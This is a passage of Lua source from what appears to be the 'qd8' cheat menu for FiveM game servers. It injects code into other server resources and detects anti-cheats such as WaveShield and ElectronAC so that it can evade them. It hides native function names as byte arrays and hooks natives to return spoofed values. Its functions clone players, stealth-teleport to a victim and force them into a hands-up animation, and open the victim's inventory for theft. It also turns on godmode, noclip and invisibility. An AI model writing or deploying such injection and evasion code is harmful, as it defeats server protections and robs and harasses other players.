            local angle = math.random() * 2 * math.pi
            local radiusOffset = math.random(5, 9)
            local xOffset = math.cos(angle) * radiusOffset
            local yOffset = math.sin(angle) * radiusOffset
            local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
            SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
            SetEntityVisible(myPed, false, 0)
            teleported = true
            Wait(100)
        end

        local playersInRadius = GetPlayersInRadius(targetCoords, radius)
        if #playersInRadius == 0 then
        end

        ClearPedTasksImmediately(myPed)
        for i = 1, 15 do
            if not DoesEntityExist(targetPed) then
                break
            end

            local curTargetCoords = GetEntityCoords(targetPed)
            if not curTargetCoords then
                break
            end

            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
            Wait(50)
            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
            Wait(50)
            DetachEntity(myPed, true, true)
            Wait(100)
        end

        Wait(500)
        ClearPedTasksImmediately(myPed)

        if originalCoords then
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z + 1.0, false, false, false, false)
            Wait(100)
            SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
        end

        if teleported then
            SetEntityVisible(myPed, true, 0)
        end
    end)
end

function qd8:HandleClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end

    local playerIdsStr = table.concat(playerIds, ",")
    MachoInjectResourceRaw("any", string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]], playerIdsStr))
end

function qd8:HandleTakeInventory(playerIds)
    if not playerIds or #playerIds == 0 then return end
    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then return end

    print("Take Inventory action executed for players: " .. table.concat(playerIds, ", "))

    local WaveDihStarted = GetResourceState("WaveShield") == 'started'

    if WaveDihStarted then
    MachoInjectResourceRaw("ox_inventory", string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("qd8 Coroutine error:", err); break end
            _w(0)
        end
    ]], targetServerId))
    else
    MachoInjectResource2(NewThreadNs, "ox_inventory", string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]], targetServerId))
    end
end

function qd8:BuildMenuFromWeaponList(categoryWeapons)
    local menuValues = {}

    for _, model in ipairs(categoryWeapons) do
        if WeaponList[model] then
            menuValues[#menuValues + 1] = WeaponList[model].label
        end
    end

    return menuValues
end

function qd8:GetWeaponModelFromLabel(modelLabel)
    for model, data in pairs(WeaponList) do
        if data.label == modelLabel then
            return model
        end
    end

    return ""
end

function qd8:RepairVehicle()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]])
end

local reaperActive = GetResourceState("ReaperV4") == "started"
local WaveActive = GetResourceState("WaveShield") == "started"
local qbJail = GetResourceState("qb-jail") == "started"

function qd8:BuildDefaultMenu()
    ActiveMenu = {
        {
            label = "Player",
            type = "subMenu",
            categories = {
                {
                    label = "Player",
                    tabs = {
                        { type = "button", label = "Revive", desc = "This will attempt to revive you by script.",
                            onSelect = function()
                                self:RevivePlayer()
                            end
                        },

                        { type = "slider", label = "Health", desc = "This will set your health to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                SetEntityHealth(PlayerPedId(), value + 100.0)
                            end
                        },
                        { type = "slider", label = "Armour", desc = "This will set your armour to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                SetPedArmour(PlayerPedId(), value)
                            end
                        },
                        { type = "button", label = "Refill Health", desc = "This will refill your health to the maximum value.",
                            onSelect = function()
                                SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
                            end
                        },
                        { type = "button", label = "Refill Armour", desc = "This will refill your armour to the maximum value.",
                            onSelect = function()
                                SetPedArmour(PlayerPedId(), 100)
                            end
                        },
                        { type = "checkbox", label = "Godmode", checked = false, desc = "This will give your player godmode.",
                            onSelect = function(checked)
                                if checked then
                                    self:EnableGodmode()
                                else
                                    self:DisableGodmode()
                                end
                            end
                        },
                        {
                            type = "checkbox", 
                            label = "Invisibility", 
                            checked = false, 
                            desc = "This will make your player invisible.",
                            onSelect = function(checked)
                                if checked then
                                    self:EnableInvisibility()
                                else
                                    self:DisableInvisibility()
                                end
                            end
                        },
                        { type = "divider", label = "Movement" },
                        {
                            type = "slider-checkbox",
                            label = "Noclip",
                            scrollType = "onScroll",
                            checked = false,
                            value = 0.25,
                            step = 0.25,
                            min = 0.25,
                            max = 5.0,
                            onSelect = function(sliderValue, checked)
                                if checked then
                                    if not FirstInjectionPassed then
                                        qd8:Notify("info", "qd8", "Initializing... Please wait!", 1000)
                                        Wait(400)
                                        FirstInjectionPassed = true
                                    end

                        if GetResourceState("WaveShield") == "started" then
                            MachoInjectResourceRaw(
                                GetResourceState("monitor") == "started" and "monitor"
                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                or "any",
                                [[
                                _G.qd8NoclipSpeed = ]] .. sliderValue .. [[
                                if not _G.qd8NoclipThreadRunning then
                                    _G.qd8NoclipEnabled = true
                                    _G.qd8NoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.qd8NoclipThreadRunning do
                                            Wait(0)
                                            if not _G.qd8NoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.qd8NoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.qd8NoclipEnabled = true
                                    _G.qd8NoclipSpeed = ]] .. sliderValue .. [[
                                end
                            ]])
                                elseif GetResourceState('ElectronAC') == 'started' or GetResourceState('FiniAC') == 'started' then
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.qd8NoclipSpeed = ]] .. sliderValue .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.qd8NoclipSpeed or ]] .. sliderValue .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.qd8NoclipSpeed = ]] .. sliderValue .. [[
                                            end
                                        ]])
                                    else
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.qd8NoclipSpeed = ]] .. sliderValue .. [[
                                            if not _G.qd8NoclipThreadRunning then
                                                _G.qd8NoclipEnabled = true
                                                _G.qd8NoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.qd8NoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.qd8NoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.qd8NoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.qd8NoclipEnabled = true
                                                _G.qd8NoclipSpeed = ]] .. sliderValue .. [[
                                            end
                                        ]])
                                    end
                                else
                                if GetResourceState("WaveShield") == 'started' then
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                    _G.qd8NoclipEnabled = false
                                    _G.qd8NoclipThreadRunning = false
                                ]])
                            elseif GetResourceState('ElectronAC') == 'started' or GetResourceState('FiniAC') == 'started' then
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.qd8NoclipEnabled = false
                                            _G.qd8NoclipThreadRunning = false
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "slider-checkbox", label = "Freecam", scrollType = "onScroll", checked = false, value = 0.25, step = 0.25, min = 0.25, max = 5.0,
                            onSelect = function(sliderValue, checked)
                                self:ToggleFreecam(checked, sliderValue)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Run",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    qd8:Notify("success", "qd8", "Fast Run On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw(
                                            GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any",
                                            [[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
